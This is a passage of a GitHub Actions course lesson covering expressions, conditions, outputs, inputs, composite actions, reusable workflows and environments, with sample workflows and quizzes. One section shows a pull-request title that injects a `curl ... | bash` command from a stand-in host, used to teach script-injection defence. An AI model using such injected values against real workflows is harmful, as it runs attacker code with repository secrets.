        # Upload even when tests fail: that is when you need the report most.
        if: ${{ !cancelled() }}
        uses: actions/upload-artifact@v7
        with:
          name: junit-py${{ matrix.python-version }}
          path: reports/junit.xml
          retention-days: 7

  build:
    # Start only when lint and every test job have passed.
    needs: [lint, test]
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v7
      - uses: docker/setup-buildx-action@v4
      - name: Build the image (no push)
        uses: docker/build-push-action@v7
        with:
          context: .
          push: false
          tags: hello-devops:ci
          # Reuse image layers from earlier runs (GitHub Actions cache).
          cache-from: type=gha
          cache-to: type=gha,mode=max
code.run: ruff check . && ruff format --check . && pytest -q && git push && gh pr checks --watch

interview.q: How would you speed up a slow CI pipeline?
interview.a: First I measure where the time goes, using the job and step timings on the run page. Then I cache what does not change, such as package downloads and Docker layers. I run independent jobs in parallel, put cheap checks such as lint first, and cancel stale runs with concurrency. If tests are the slow part, I split them across parallel jobs and move slow end-to-end tests to a later stage.

interview.q: What are required status checks, and what can go wrong with them?
interview.a: They are checks named in a ruleset or branch protection rule that must pass before a pull request can merge. GitHub matches them by exact name, so renaming a job or changing a matrix can drop protection until you update the list. A workflow skipped by a path or branch filter leaves its checks Pending and blocks the merge. And a job skipped because its dependency failed counts as success, so you must also require the earlier jobs.

interview.q: What is the difference between a cache and an artifact in GitHub Actions?
interview.a: A cache is a speed-up for future runs, such as downloaded packages, stored under a key and restored when the key matches. It is best effort: GitHub evicts entries unused for 7 days. An artifact is an output of one run, such as a test report or a build, that people or later jobs download. Since upload-artifact v4, artifacts cannot be changed after upload and need unique names per run.

deeper.body:
Listing every matrix check in the ruleset works, but it can break quietly. Add Python 3.15 next year and forget the ruleset, and the new check is not required. Rename a job, and the old required name never reports again, so every PR waits forever.

Many teams fix this with one gate job at the end of the workflow, and they require only that job. The gate has:

- `needs: [lint, test, build]`, so it waits for every other job.
- `if: ${{ always() }}`, so it runs even when a needed job failed or was skipped.
- One step that runs `exit 1` when `contains(needs.*.result, 'failure')` or `contains(needs.*.result, 'cancelled')` is true.

`needs.*.result` is a list with the result of each needed job: `success`, `failure`, `cancelled` or `skipped`. The gate turns that list into one answer. Using `always()` is safe here, because the gate only reads results and runs nothing risky. Day 20 explains `always()` and the `needs` context in detail.

Why not a gate with plain `needs` and no `if`? A failed test would then skip the gate, and a skipped gate counts as passed. It is the same trap as before, one level further down. With `always()`, the gate runs every time and reports what really happened.

For a small repository with four checks, a gate is overkill and listing the checks is clearer, so the lab does that. Reach for a gate when your matrix grows or when some jobs only run sometimes.

Caches deserve one more look, because they are shared between runs. Anything a job writes into a cached folder, a later run restores and may execute. That is why GitHub limits who can write caches for the default branch, and why the docs tell you never to cache secrets. Since 2026 you can also set a `cache-mode` key on a job: `read`, `write`, `write-only` or `none`. It gives the job only the cache access it needs, for example `read` for a job that handles untrusted input. See the [dependency caching reference](https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching).

Read more about required checks in [Troubleshooting required status checks](https://docs.github.com/en/pull-requests/how-tos/merge-and-close-pull-requests/troubleshooting-required-status-checks).

lessons.goal: By the end you can make jobs and steps run only when they should, pass values between steps and jobs, take inputs from the Run workflow button, and move repeated steps into a composite action or a reusable workflow.

guess.q: A step has `if: github.ref == 'refs/heads/main'`. The run is on main, and an earlier step in the same job failed. Does the step run?
options: Yes, because the condition is true
No, because every if gets a hidden success() check
Yes, because if conditions ignore earlier steps
Only if the job sets continue-on-error
guess.why: An if without a status function gets success() added, so after a failure the step is skipped. Put failure(), always() or !cancelled() in the condition to change that.

terms.plain: A named set of facts about the run, such as github or steps, read with ${{ }}.
A small formula inside ${{ }} that GitHub works out before the step runs.

A named value a step writes to $GITHUB_OUTPUT, read later as steps.<id>.outputs.<name>.
A step output copied up to the job, so other jobs can read it through needs.
Several steps bundled in an action.yml file and used as one step.
A workflow with on: workflow_call that other workflows call in place of a job.
A named deploy target, such as production, with its own rules and secrets.

sections.h: Two moments: GitHub reads, then the runner runs
sections.body:
Everything in this lesson gets easier once you see that a workflow is read at two different moments.

First, GitHub reads the YAML on its own servers. It decides which jobs to start, works out every `${{ ... }}` expression, and pastes the results into the text. Only then does it send a job to a runner. Second, the runner runs your steps, and the shell expands `$VARIABLES` while each script runs.

So `run: echo "Branch ${{ github.ref_name }}"` never reaches the shell in that form. On a push to `main`, bash receives `echo "Branch main"`. The expression was replaced before bash even started.

Two consequences follow, and both trip people up:

- Pasted text becomes code. Say an expression holds text that someone else controls, such as a pull request title. A title with a quote mark in it can end your string and add its own commands. Put such values in `env:` and use `"$TITLE"` in the script, so the shell treats them as data.
- A job-level `if:` is checked before any runner exists. It can only use what GitHub knows at that moment, which is the `github`, `needs`, `vars` and `inputs` contexts. The `env`, `steps` and `runner` contexts do not exist yet, so `if: env.DEPLOY == 'yes'` on a job is an error.

When something behaves strangely, ask which of the two moments you are in.

sections.h: Contexts and expressions
sections.body:
A **context** is a named set of facts that GitHub fills in for each run. You read one with an expression, written `${{ ... }}`. These are the ones you will use:

- `github`: the run itself, such as `github.sha`, `github.ref`, `github.event_name`, and the event's data under `github.event`.
- `env`: variables set with `env:` in the workflow, the job or the step.
- `vars` and `secrets`: configuration variables and secrets stored in the repository settings (Day 21).
- `inputs`: values typed into the Run workflow form, or passed to a reusable workflow.
- `matrix`: the values of the current matrix job, such as `matrix.python-version`.
- `steps` and `needs`: results and outputs of earlier steps in this job, and of the jobs this job needs.
- `runner` and `job`: facts about this machine and this job, such as `runner.os` and `job.status`.

Expressions have the usual operators: `==`, `!=`, `&&`, `||` and `!`. Strings go in single quotes, and comparisons ignore upper and lower case. A few functions help: `contains()`, `startsWith()`, `format()`, `toJSON()`, `fromJSON()` and `hashFiles()`.

A property that does not exist gives an empty string, not an error. So a typo such as `github.event_nmae` fails quietly on GitHub, and actionlint is the tool that catches it. To see what a context really holds, print it once: put `CTX: ${{ toJSON(github) }}` under a step's `env:` and run `echo "$CTX"`. It is the fastest way to learn what an event carries. Do it in a practice workflow only: the `github` context includes `github.token`, and although GitHub masks it in logs, the docs ask you to be careful.

refs.title: GitHub Actions tutorial: advanced concepts, part 2 (KodeKloud)

sections.h: Conditions: if and the four status functions
sections.body:
Any job or step can have an `if:`. When the expression is false, GitHub skips that job or step. A job skipped this way counts as passed for required checks.

Here is the part that catches almost everyone. Every `if:` that does not contain a status function gets an invisible `success()` added to it. `success()` is true only when everything before it succeeded. So `if: github.ref == 'refs/heads/main'` really means `success() && github.ref == 'refs/heads/main'`, and after a failed step it is false.

There are four status functions:

- `success()`: everything before succeeded. This is the default.
- `failure()`: something before failed. In a job with `needs`, a failed job anywhere up the chain counts.
- `cancelled()`: the run was cancelled.
- `always()`: true no matter what, even during a cancel.

To run after a failure, say so: `if: ${{ failure() && steps.smoke.outcome == 'failure' }}` runs only when that one step failed. To run whatever happened, prefer `!cancelled()`. GitHub's docs warn against `always()` on important steps. Such a step also runs while the run is being cancelled, and if it gets stuck, it hangs until the timeout. The `always()` function fits small jobs that only report, like the one in today's worked example.

A step can also be allowed to fail with `continue-on-error: true`. Then `steps.<id>.outcome` says `failure`, while `steps.<id>.conclusion` says `success`, and the job carries on.

refs.title: Using conditions to control job execution

sections.h: Passing values: outputs, GITHUB_ENV and the run summary
sections.body:
Each step runs in a new shell, and each job runs on a new machine. To pass a value along, you append it to one of the files the runner gives every step. Their paths are in environment variables:

- `$GITHUB_OUTPUT`: `echo "version=1.4.0" >> "$GITHUB_OUTPUT"` creates a step output. Give the step an `id`, such as `meta`, and later steps read `${{ steps.meta.outputs.version }}`.
- `$GITHUB_ENV`: `echo "IMAGE=hello-devops:ci" >> "$GITHUB_ENV"` sets `$IMAGE` for every later step in the same job. The step that writes it does not see it.
- `$GITHUB_STEP_SUMMARY`: Markdown you append here appears on the run's summary page, so people see results without opening a log.

Between jobs you need one more hop, because jobs share nothing. Under the job's `outputs:`, map a name to a step output. A job that `needs` it then reads `${{ needs.version.outputs.version }}`. The diagram shows the whole path.

Outputs are always strings. A step that writes `ok=true` gives the text 'true', so compare with `== 'true'`, or turn it back into a boolean with `fromJSON()`. For a value with several lines, use the `name<<EOF` form from the workflow commands docs. And never write a secret to any of these files: outputs and summaries are visible to everyone who can read the run.

sections.h: Inputs for the Run workflow button
sections.body:
`workflow_dispatch` adds a Run workflow button. Add `inputs:` and the button opens a small form; the values land in the `inputs` context. Each input has a type:

- `boolean`: a tick box, `true` or `false`.
- `choice`: a drop-down list built from `options`.
- `string` and `number`: a text field.
- `environment`: a drop-down of the repository's environments.

From the terminal, the same form is `gh workflow run ci.yml -f smoke-test=false`. A workflow can have up to 25 inputs.

Two details matter. The `inputs` context keeps booleans as booleans, while the older `github.event.inputs` turns them into the strings 'true' and 'false'. Use `inputs`. And when the same workflow runs because of a push, `inputs.smoke-test` is empty, not `true`. Defaults apply only to a manual run.

That is why today's lab writes its condition as `github.event_name != 'workflow_dispatch' || inputs.smoke-test`. On a push or a pull request the first half is true, so the step runs. On a manual run the first half is false, and the tick box decides.

Inputs come from people with write access to the repository, so they are more trusted than a PR title. Pass string inputs through `env:` anyway; it costs one line and keeps the habit.

sections.h: Reuse: composite actions and reusable workflows
sections.body:
Once two jobs repeat the same steps, you want to write those steps once. GitHub has two tools for that, and they work at different levels.

A **composite action** bundles steps into a single step. It is a folder with an `action.yml` that says `runs: using: composite` and lists the steps. It can take `inputs` and give `outputs`, and every `run` step inside it must name its `shell`. You call it like any other action, with `uses:`. For an action in your own repository the path starts with `./`, as in `uses: ./.github/actions/setup-app`. It only works after `actions/checkout`, because the folder must be on the runner. A composite action cannot read the `secrets` context; the caller passes secrets in as inputs.

A reusable workflow is a whole workflow that other workflows call like a function. Its `on:` lists `workflow_call`, with typed `inputs`, named `secrets` and `outputs`. The caller uses it in place of a job's steps: `uses: ./.github/workflows/build.yml` plus `with:`, and `secrets: inherit` passes along all of the caller's secrets. The limits worth knowing:

- Calls nest at most 10 levels deep, with at most 50 different reusable workflows in one run.
- The caller's workflow-level `env` does not reach the called workflow. Use inputs or `vars`.
- Token permissions can stay the same or shrink down the chain, never grow.
- The called jobs show up as new checks, so required check names in a ruleset change.

Which one to pick? Steps that run inside one job, such as setup, belong in a composite action. Whole jobs with their own runners, environments or secrets belong in a reusable workflow. In a single repository I start with a composite action and switch only when I need separate jobs.

refs.title: Ultimate guide to GitHub composite actions (CoderDave)

sections.h: Environments, a first look
sections.body:
One more key shows up in real pipelines: `environment:` on a job, as in `environment: production`. An environment is a named place you deploy to, set up under Settings, Environments. It does three things for the jobs that name it:

- Its protection rules run first: required reviewers, a wait timer, or a rule that only certain branches or tags may deploy.
- Its own secrets and variables reach only those jobs, and only after the rules pass.
- Each run is recorded as a deployment, which you can open from the repository page.

So a production password can live in the `production` environment, where a pull request job never sees it. On the Free, Pro and Team plans, required reviewers and wait timers only work in public repositories, and yours is public.

Day 21 uses an environment for real: the release workflow waits for your approval before it pushes an image. Today, just learn to recognise the key when you read other people's workflows.

lessons.analogy: Think of a workflow as a recipe that a head chef prepares before service. Expressions are the blanks the chef fills in on the ticket in advance ("table 12, no salt"), so the cook only ever sees the finished ticket. Step outputs are notes the cook leaves for the next cook at the same station, and job outputs are the notes passed through the kitchen hatch to another station. A composite action is a sub-recipe card, such as "make the sauce", used inside any dish. The picture breaks on timing: a real chef can change a ticket while the cook works, and GitHub never changes an expression after the job has started.

worked.title: A three-job pipeline on your laptop, with act

steps.say: Practise in a scratch repository, so hello-devops stays clean. The tool act (Day 19) runs workflows in Docker on your Mac. For shell-only jobs, the `ubuntu:24.04` image you pulled on Day 2 is all it needs. Create the folder and paste `logic-demo.yml` from the Files section, then commit, because act takes `GITHUB_SHA` from your last commit.
steps.code:
mkdir -p ~/code/logic-demo/.github/workflows
cd ~/code/logic-demo
git init -b main
code .github/workflows/logic-demo.yml
git add -A && git commit -m "Add logic demo"

steps.say: Look at the `version` job first. The step writes `version=...` to `$GITHUB_OUTPUT`, and the job's `outputs:` block copies that step output up to the job. Without that block, no other job could see it.
steps.code:
version:
  runs-on: ubuntu-latest
  outputs:
    version: ${{ steps.make.outputs.version }}
  steps:
    - name: Make a version from the commit
      id: make
      run: |
        VERSION="1.4.0-ci.${GITHUB_SHA::7}"
        echo "version=$VERSION" >> "$GITHUB_OUTPUT"
        echo "Made version $VERSION"

steps.say: `act -l` lists the jobs without running them. The stages come from `needs`: `build` needs `version`, and `report` needs both, so they run one after another.
steps.code:

Stage  Job ID   Job name  Workflow name  Workflow file   Events
0      version  version   logic-demo     logic-demo.yml  workflow_dispatch
1      build    build     logic-demo     logic-demo.yml  workflow_dispatch
2      report   report    logic-demo     logic-demo.yml  workflow_dispatch

steps.say: Run it. On its first run act may ask which default image to use; any answer works, because `-P` picks the image here. The grep keeps only the lines your steps printed. The version made in the first job reaches the second through `needs`, and `build` passed it on to a later step through `$GITHUB_ENV`.
steps.code:
$ act workflow_dispatch -P ubuntu-latest=ubuntu:24.04 2>&1 | grep -F ' | '
[logic-demo/version]   | Made version 1.4.0-ci.cdae07f
[logic-demo/build  ]   | Building hello-devops:1.4.0-ci.cdae07f
[logic-demo/report ]   | Job results were [
[logic-demo/report ]   |   "success",
[logic-demo/report ]   |   "success"
[logic-demo/report ]   | ]

steps.say: Now tick the box: `--input` fills the `break-build` input, just like the form on GitHub. The step `Fail on purpose` runs and exits 1. Write the summary is skipped, because of the hidden `success()`. `report` still runs, thanks to `always()`, and sees one failure. The order of the list is not fixed; it changed between my runs.
steps.code:
$ act workflow_dispatch -P ubuntu-latest=ubuntu:24.04 --input break-build=true 2>&1 | grep -E ' \| |exitcode|^Error'
[logic-demo/version]   | Made version 1.4.0-ci.cdae07f
[logic-demo/build  ]   | Building hello-devops:1.4.0-ci.cdae07f
[logic-demo/build  ]   | Breaking the build, as you asked
[logic-demo/build  ] exitcode '1': failure
[logic-demo/report ]   | Job results were [
[logic-demo/report ]   |   "success",
[logic-demo/report ]   |   "failure"
[logic-demo/report ]   | ]
Error: Job 'build' failed

steps.say: Turn the `build` job into a reusable workflow. Copy `build.yml` from the Files section: it starts with `on: workflow_call` and declares its two inputs. In `logic-demo.yml`, the job's steps make way for a call with arguments.
steps.code:
build:
  needs: version
  # Call the reusable workflow, like calling a function with arguments.
  uses: ./.github/workflows/build.yml
  with:
    version: ${{ needs.version.outputs.version }}
    break-build: ${{ inputs.break-build }}

steps.say: Commit and run again. The result is the same, but act now labels the build line `build/build/build`, a name built from the reusable workflow and its jobs. On GitHub, too, the called job's check gets a new name, which is why a ruleset may need updating after this kind of refactor.

code.title: .github/actions/setup-app/action.yml
code.src:
# A composite action: a few steps bundled into one, used as a single step.
# ci.yml calls it with: uses: ./.github/actions/setup-app (after checkout).
name: Set up hello-devops
description: Install Python with a pip cache, then install the app and its test tools.

inputs:
  python-version:
    description: Python version to install, for example "3.14"
    required: false
    default: "3.14"

runs:
  using: composite
  steps:
    - name: Set up Python (with a pip cache)
      uses: actions/setup-python@v7
      with:
        python-version: ${{ inputs.python-version }}
        cache: pip
        cache-dependency-path: requirements*.txt
    - name: Install dependencies
      # A run step inside a composite action must name its shell.
      shell: bash
      run: pip install -r requirements-dev.txt
code.run: actionlint && git add .github/actions && git commit -m "Add a setup-app composite action"

code.title: .github/workflows/ci.yml (Day 20 version)
code.src:
name: ci

on:
  push:
    branches: [main]
    # Skip CI on main when a push only changes Markdown files.
    # Never filter pull_request like this: a required check that never runs
    # stays "Pending" and blocks the merge.
    paths-ignore:
      - "**.md"
  pull_request:
  # The Run workflow button. Its input can switch the smoke test off.
  workflow_dispatch:
    inputs:
      smoke-test:
        description: "Start the CI image and call it after the build"
        type: boolean
        default: true

# One run per branch or pull request. A new push cancels the older run,
# except on main, where every merge gets a full result.
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}

# The GITHUB_TOKEN in this workflow can only read the repository.
permissions:
  contents: read

jobs:
  lint:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@v7
      # Our own composite action: Python, the pip cache and dependencies.
      # It lives in this repository, so it only works after checkout.
      - uses: ./.github/actions/setup-app
      - name: Lint and format check
        run: ruff check . && ruff format --check .

  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    strategy:
      # Let every Python version finish, so you see all failures at once.
      fail-fast: false
      matrix:
        python-version: ["3.13", "3.14"]
    steps:
      - uses: actions/checkout@v7
      - uses: ./.github/actions/setup-app
        with:
          python-version: ${{ matrix.python-version }}
      - name: Run tests
        run: pytest -q --junitxml=reports/junit.xml
      - name: Upload test report
        # Upload even when tests fail: that is when you need the report most.
        if: ${{ !cancelled() }}
        uses: actions/upload-artifact@v7
        with:
          name: junit-py${{ matrix.python-version }}
          path: reports/junit.xml
          retention-days: 7

  build:
    # Start only when lint and every test job have passed.
    needs: [lint, test]
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v7
      - uses: docker/setup-buildx-action@v4

      # A step output: a version for this CI image, such as 0.0.0-ci.1a2b3c4.
      - name: Work out a version for this build
        id: meta
        run: echo "version=0.0.0-ci.${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"

      - name: Build the image (no push)
        uses: docker/build-push-action@v7
        with:
          context: .
          push: false
          # Also load the image into the runner's Docker, so a step can run it.
          load: true
          tags: hello-devops:ci
          build-args: APP_VERSION=${{ steps.meta.outputs.version }}
          # Reuse image layers from earlier runs (GitHub Actions cache).
          cache-from: type=gha
          cache-to: type=gha,mode=max

      # An image that builds can still crash at start. Run it and call it.
      # Skipped only on a manual run with the smoke-test box unticked.
      - name: Smoke test the image
        id: smoke
        if: ${{ github.event_name != 'workflow_dispatch' || inputs.smoke-test }}
        env:
          VERSION: ${{ steps.meta.outputs.version }}
        run: |
          docker run -d --name smoke -p 8000:8000 hello-devops:ci
          # Gunicorn needs a moment to start, so retry for up to 10 seconds.
          curl -fsS --retry 10 --retry-all-errors --retry-delay 1 localhost:8000/healthz
          GOT=$(curl -fsS localhost:8000/ | jq -r .version)
          echo "The app reports version $GOT"
          test "$GOT" = "$VERSION"

      - name: Show the app's logs if the smoke test failed
        if: ${{ failure() && steps.smoke.outcome == 'failure' }}
        run: docker logs smoke

      - name: Write the run summary
        if: ${{ !cancelled() }}
        env:
          VERSION: ${{ steps.meta.outputs.version }}
          SMOKE: ${{ steps.smoke.outcome }}
        run: |
          {
            echo "### CI image"
            echo "- Version: \`$VERSION\`"
            echo "- Smoke test: $SMOKE"
          } >> "$GITHUB_STEP_SUMMARY"
code.run: actionlint && git commit -am "CI: composite action, smoke test and summary" && git push && gh pr checks --watch

code.title: logic-demo/.github/workflows/logic-demo.yml (practice, in a scratch repo)
code.src:
name: logic-demo

on:
  workflow_dispatch:
    inputs:
      break-build:
        description: "Make the build job fail on purpose"
        type: boolean
        default: false

jobs:
  version:
    runs-on: ubuntu-latest
    # Job output: copy the step output up to the job, so other jobs can read it.
    outputs:
      version: ${{ steps.make.outputs.version }}
    steps:
      - name: Make a version from the commit
        id: make
        run: |
          VERSION="1.4.0-ci.${GITHUB_SHA::7}"
          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
          echo "Made version $VERSION"

  build:
    needs: version
    runs-on: ubuntu-latest
    env:
      VERSION: ${{ needs.version.outputs.version }}
    steps:
      - name: Save the image name for later steps
        run: echo "IMAGE=hello-devops:$VERSION" >> "$GITHUB_ENV"
      - name: Pretend to build
        run: echo "Building $IMAGE"
      - name: Fail on purpose
        if: ${{ inputs.break-build }}
        run: |
          echo "Breaking the build, as you asked"
          exit 1
      - name: Write the summary
        run: echo "Built \`$IMAGE\`" >> "$GITHUB_STEP_SUMMARY"

  report:
    needs: [version, build]
    # always(): run even when a job it needs has failed.
    if: ${{ always() }}
    runs-on: ubuntu-latest
    steps:
      - name: Print every job result
        env:
          RESULTS: ${{ toJSON(needs.*.result) }}
        run: echo "Job results were $RESULTS"

lessons.mistake: The most common mistake is expecting a step to run after a failure because its condition looks true, such as `if: github.ref == 'refs/heads/main'` on a cleanup or notify step. The hidden `success()` skips it every time something earlier fails, which is exactly when you wanted it. Write the status function yourself: `failure()` for 'only after a failure', `!cancelled()` for 'whatever happened'.
lessons.real_world: PayLoop's platform team keeps a few composite actions, such as one that sets up the JVM and the Gradle cache. It also keeps two reusable workflows: one builds and scans an image, and one deploys through an environment with approvals. Each service's own workflow is about thirty lines of calls. When the team fixes the scan step, every service picks up the fix on its next run. Services pin the reusable workflows to a commit, so a bad change cannot spread everywhere at once.

task.title: Teach the lab's CI three new tricks

explain_back.prompt: Explain how a value made in one job reaches another job, in 3 to 4 sentences. Mention GITHUB_OUTPUT, the job's outputs block and needs, and say why GITHUB_ENV is not enough.
explain_back.answer: A step appends a line like version=1.4.0 to the file in $GITHUB_OUTPUT. Because the step has an id, later steps can read it as steps.make.outputs.version. The job's outputs block maps a job output to that step output. Another job that lists the first one under needs then reads it as needs.version.outputs.version. GITHUB_ENV only sets variables for later steps on the same runner, and every job runs on a fresh machine, so it cannot carry a value across jobs.

recap: GitHub works out ${{ }} expressions before the shell runs, so pass untrusted text through env.
A job-level if can only use github, needs, vars and inputs; steps, env and runner do not exist yet.
Every if without a status function gets success(); use failure() or !cancelled() to run after a failure.
GITHUB_OUTPUT makes step outputs, a job's outputs block shares them through needs, and GITHUB_ENV only reaches later steps in the same job.
workflow_dispatch inputs fill the inputs context; on other events they are empty, so test github.event_name first.
A composite action bundles steps into one step; a reusable workflow bundles whole jobs and can take secrets.

check.q: A job uploads a crash report with `if: ${{ failure() }}`. The run is cancelled halfway through. Does the upload run?
options: Yes, because a cancel counts as a failure
Yes, because if conditions are checked only at the start
Only if the job also has timeout-minutes
No, because failure() is false when the run is cancelled
check.why: failure() is true only when an earlier step or job failed. A cancel is a different outcome; always() or cancelled() would cover it.

check.q: Job deploy must use the image tag that job build computed. Which line reads it inside deploy?
options: ${{ steps.build.outputs.tag }}
${{ needs.build.outputs.tag }}
$TAG, set in build with GITHUB_ENV
${{ env.build.tag }}
check.why: Other jobs read job outputs through the needs context. steps only covers the current job, and GITHUB_ENV never leaves its runner.

check.q: Three repositories need the same deploy: its own job on a separate runner, the production environment's approval, and a cloud secret. What do you build?
options: A reusable workflow with on: workflow_call
A composite action in .github/actions
A YAML anchor copied into each file
A workflow_dispatch input with the secret
check.why: Whole jobs with their own runner, environment and secrets are what reusable workflows are for. A composite action runs inside one job and cannot read secrets itself.

interview.q: When do you use a composite action, and when a reusable workflow?
interview.a: A composite action bundles steps and runs as one step inside a job, so it fits shared setup such as installing a toolchain and restoring caches. A reusable workflow bundles whole jobs, each with its own runner, environment and secrets, so it fits shared build or deploy pipelines. Composite actions cannot read secrets themselves and log as one step. Reusable workflows can nest ten levels deep, do not see the caller's env, and change the names of required checks, so I plan rulesets around them.

interview.q: What is script injection in GitHub Actions, and how do you prevent it?
interview.a: GitHub replaces ${{ }} expressions in a run script before the shell starts, so the value becomes part of the script's text. If the value is controlled by someone else, such as a pull request title or a branch name, a quote in it can end a string and add commands. The fix is to pass the value through an environment variable and use "$VAR" in the script, so the shell treats it as data. Tools like actionlint flag untrusted values used directly in scripts.

interview.q: Why might a cleanup step with `if: github.ref == 'refs/heads/main'` never run when it is needed?
interview.a: Every if that does not use a status function gets an implicit success() check. When an earlier step fails, success() is false, so the cleanup is skipped exactly when something went wrong. To run it after failures too, I write if: ${{ !cancelled() && github.ref == 'refs/heads/main' }}, or failure() if it should only run after a failure.

deeper.body:
Section one said pasted text becomes code. Here is what that looks like, so you recognise it in other people's workflows.

Take a step meant to greet contributors: `run: echo "Thanks for the PR ${{ github.event.pull_request.title }}"`. GitHub pastes the title into the script before bash starts. A normal title gives `echo "Thanks for the PR Fix typo"`. Now someone opens a PR with this title: `x"; curl -s https://evil.example/steal.sh | bash; echo "`. After pasting, the script contains three commands, and the middle one downloads and runs a stranger's script on your runner, with whatever token and secrets that job holds.

The fields an outsider controls are the ones to watch. In the `github` context they include titles and bodies of issues and pull requests, comment bodies, commit messages, author names and emails, and branch names (`github.head_ref`). The safe pattern is the one this course has used since Day 18:

1. Put the value in `env:` on the step, as in `TITLE: ${{ github.event.pull_request.title }}`.
2. Use it in the script as `"$TITLE"`, with the double quotes.

Now the shell receives the text as data in a variable, and no quote in it can change the script. The same rule applies to `actions/github-script` and any other place where an expression lands inside code.

You do not have to spot these by eye. actionlint reports them. For that greeting step it prints `"github.event.pull_request.title" is potentially untrusted. avoid using it directly in inline scripts.` and tells you to use an environment variable. Run it before every push, and add it to CI later if you like.

Two more facts make the risk smaller for you today. A pull request from a fork gets no secrets and only a read-only token in a `pull_request` workflow, so the damage is limited. The dangerous combination is untrusted text plus a privileged trigger, such as `pull_request_target`. Day 21 looks at that trigger and why GitHub is starting to block it by default in public repositories. Read GitHub's page on [script injections](https://docs.github.com/en/actions/concepts/security/script-injections) for more examples.

guess.q: Your workflow uses `${{ secrets.GITHUB_TOKEN }}`. Where does that token come from?
options: You create it once in Settings and paste it in as a secret
GitHub creates a fresh one for each job, and it expires when the job ends
It is your personal password, reused by GitHub
It is shared by all your repositories and never expires
guess.why: GitHub makes a new GITHUB_TOKEN at the start of every job, limited to the current repository and the permissions you allow. It stops working when the job finishes.

A plain, non-secret setting stored in GitHub and read as vars.NAME.
A short-lived token GitHub creates for each job, limited to the current repository.
Giving a token or a person only the access the task needs, and nothing more.
A check on an environment, such as a required reviewer, that must pass before a job runs.
A way for a workflow to prove who it is to a cloud and get short-lived keys.
